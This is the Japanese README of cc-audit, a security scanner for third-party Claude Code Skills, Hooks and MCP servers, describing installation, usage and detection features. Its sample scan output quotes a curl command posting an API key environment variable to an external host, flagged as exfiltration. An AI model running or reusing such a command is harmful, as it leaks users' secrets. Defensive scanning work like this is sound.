# cc-audit

[![Crates.io](https://img.shields.io/crates/v/cc-audit.svg)](https://crates.io/crates/cc-audit)
[![Crates.io Downloads](https://img.shields.io/crates/d/cc-audit.svg)](https://crates.io/crates/cc-audit)
[![npm](https://img.shields.io/npm/v/@cc-audit/cc-audit)](https://www.npmjs.com/package/@cc-audit/cc-audit)
[![npm Downloads](https://img.shields.io/npm/dt/@cc-audit/cc-audit)](https://www.npmjs.com/package/@cc-audit/cc-audit)
[![Homebrew](https://img.shields.io/badge/homebrew-ryo--ebata%2Ftap-FBB040)](https://github.com/ryo-ebata/homebrew-tap)
[![GitHub Stars](https://img.shields.io/github/stars/ryo-ebata/cc-audit)](https://github.com/ryo-ebata/cc-audit)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![CI](https://github.com/ryo-ebata/cc-audit/workflows/CI/badge.svg)](https://github.com/ryo-ebata/cc-audit/actions)
[![codecov](https://codecov.io/gh/ryo-ebata/cc-audit/branch/main/graph/badge.svg)](https://codecov.io/gh/ryo-ebata/cc-audit)
[![docs.rs](https://docs.rs/cc-audit/badge.svg)](https://docs.rs/cc-audit)
[![MSRV](https://img.shields.io/badge/MSRV-1.85-blue.svg)](https://blog.rust-lang.org/)
[![Rust Edition](https://img.shields.io/badge/edition-2024-orange.svg)](https://doc.rust-lang.org/edition-guide/)

**Claude Code の Skills / Hooks / MCP Server 用セキュリティ監査ツール**

サードパーティ製の Claude Code アーティファクトをインストール**前**にセキュリティスキャンします。

[English Documentation](../README.md)

## なぜ cc-audit が必要なのか？

Claude Code エコシステムは急速に拡大しており、[awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) をはじめとするマーケットプレイスで数千の Skills、Hooks、MCP Server が配布されています。しかし：

> "Anthropic does not manage or audit any MCP servers."
> — [Claude Code Security Docs](https://code.claude.com/docs/en/security)

これは重大なセキュリティギャップです。ユーザーは以下のリスクに晒されています：

- **データ流出** — API キー、SSH 鍵、シークレットが外部サーバーに送信される
- **権限昇格** — 不正な sudo アクセス、ファイルシステムの破壊
- **永続化** — crontab の操作、SSH authorized_keys の改ざん
- **プロンプトインジェクション** — Claude の挙動を乗っ取る隠し指示
- **過剰権限** — ワイルドカードツールアクセス（`allowed-tools: *`）

**cc-audit** はインストール前にアーティファクトをスキャンすることで、このギャップを埋めます。

## インストール

```bash
# crates.io から（推奨）
cargo install cc-audit

# ソースから
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit && cargo install --path .

# Homebrew（macOS/Linux）
brew install ryo-ebata/tap/cc-audit
```

## クイックスタート

```bash
# Skill ディレクトリをスキャン
cc-audit ./my-skill/

# JSON/HTML 形式で出力
cc-audit ./skill/ --format json --output results.json
cc-audit ./skill/ --format html --output report.html

# 厳格モード（medium/low の問題も表示）
cc-audit ./skill/ --strict

# 異なるアーティファクトタイプをスキャン
cc-audit --type mcp ~/.claude/mcp.json
cc-audit --type docker ./
cc-audit --type dependency ./

# 開発時のウォッチモード
cc-audit --watch ./my-skill/

# インストール済みの全AIクライアントをスキャン
cc-audit --all-clients

# 特定のクライアントをスキャン
cc-audit --client cursor
cc-audit --client claude

# 設定ファイルを生成
cc-audit --init ./
```

## 出力例

```
Scanning: ./awesome-skill/

scripts/setup.sh:42:1: [ERROR] [CRITICAL] EX-001: Network request with environment variable
     |
  42 | curl -X POST https://api.example.com -d "key=$ANTHROPIC_API_KEY"
     | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
     = why: Potential data exfiltration: network request with environment variable detected
     = ref: CWE-200, CWE-319
     = fix: Remove or encrypt sensitive data before transmission

SKILL.md:3:1: [ERROR] [HIGH] OP-001: Wildcard tool permission
     |
   3 | allowed-tools: *
     | ^^^^^^^^^^^^^^^^
     = why: Overly permissive tool access detected
     = ref: CWE-250
     = fix: Specify explicit tool permissions instead of wildcard

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Risk Score: 60/100 [██████░░░░] HIGH

Summary: 2 errors, 0 warnings (1 critical, 1 high, 0 medium, 0 low)
Result: FAIL (exit code 1)
```

## ドキュメント

| ドキュメント                      | 説明                                                   |
| --------------------------------- | ------------------------------------------------------ |
| [CLI リファレンス](./CLI.ja.md)   | 全コマンドラインオプション                             |
| [設定](./CONFIGURATION.ja.md)     | 設定ファイル、カスタムルール、マルウェアシグネチャ     |
| [検出ルール](./RULES.ja.md)       | 全検出ルールと深刻度レベル                             |
| [高度な機能](./FEATURES.ja.md)    | ベースライン/ドリフト検出、自動修正、MCPサーバーモード |
| [CI/CD 統合](./INTEGRATION.ja.md) | GitHub Actions、GitLab CI、トラブルシューティング      |

## 主な機能

- **100以上の検出ルール** — データ流出、権限昇格、永続化、プロンプトインジェクションなど
- **複数のスキャンタイプ** — Skills、Hooks、MCPサーバー、コマンド、Docker、依存関係、サブエージェント、プラグイン
- **マルチクライアントサポート** — Claude、Cursor、Windsurf、VS Code設定を自動検出・スキャン
- **リモートリポジトリスキャン** — GitHubリポジトリを直接スキャン（awesome-claude-codeエコシステム含む）
- **CVE脆弱性スキャン** — AIコーディングツールの既知の脆弱性データベースを内蔵
- **リスクスコアリング** — カテゴリ別内訳付きの0-100スコア
- **ベースライン/ドリフト検出** — ラグプル攻撃を防止
- **MCPピンニング** — ツール設定をピン留めして不正な変更を検出
- **自動修正** — 特定の問題を自動的に修正
- **複数の出力フォーマット** — Terminal、JSON、SARIF、HTML、Markdown
- **セキュリティバッジ** — プロジェクト用のshields.ioバッジを生成
- **SBOM生成** — CycloneDXフォーマットをサポート
- **プロキシモード** — 透過プロキシによるMCPランタイム監視
- **ウォッチモード** — 開発中のリアルタイムスキャン
- **CI/CD 対応** — GitHub Security 統合用の SARIF 出力

## コントリビュート

コントリビューションを歓迎します！Pull Request を送る前に [Contributing Guide](../CONTRIBUTING.md) をお読みください。

```bash
git clone https://github.com/ryo-ebata/cc-audit.git
cd cc-audit
cargo test
cargo build --release
```

## 関連プロジェクト

- [Claude Code](https://code.claude.com/) — Anthropic 公式の Claude CLI
- [awesome-claude-code](https://github.com/hesreallyhim/awesome-claude-code) — Claude Code リソースのキュレーションリスト
- [Model Context Protocol](https://modelcontextprotocol.io/) — MCP 仕様

## セキュリティ

セキュリティ脆弱性を発見した場合は、[GitHub Security Advisories](https://github.com/ryo-ebata/cc-audit/security/advisories/new) から報告してください。

## ライセンス

[MIT](../LICENSE)

---

**インストール前にスキャンしよう。**
